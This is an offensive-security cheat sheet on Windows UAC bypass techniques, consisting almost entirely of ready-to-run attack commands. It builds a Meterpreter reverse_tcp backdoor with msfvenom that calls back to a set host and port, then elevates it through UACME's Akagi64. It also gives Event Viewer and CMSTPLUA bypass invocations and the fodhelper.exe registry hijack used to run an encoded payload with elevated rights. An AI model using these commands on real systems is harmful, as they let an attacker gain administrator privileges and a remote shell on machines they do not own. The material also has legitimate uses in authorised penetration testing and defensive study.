---
title: UAC Bypass Techniques
category: privesc
subcategory: windows-uac
os: windows
command: .\Akagi64.exe 23 C:\Temp\backdoor.exe
tools: UACME, fodhelper, EventViewer-UACBypass
---


### UACME (Akagi)

```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

### Event Viewer UAC bypass

```powershell
Import-Module .\Invoke-EventViewer.ps1
Invoke-EventViewer cmd.exe
```

Reference: https://github.com/CsEnox/EventViewer-UACBypass

### CMSTPLUA UAC Bypass

```cmd
UACBypassCMSTPLUA.x86.exe cmd /k whoami
```

### fodhelper.exe registry bypass

```cmd
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "<encoded-payload>" /f
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
fodhelper.exe
```

Verify the value:

```cmd
REG query HKCU\Software\Classes\ms-settings\Shell\Open\command
```
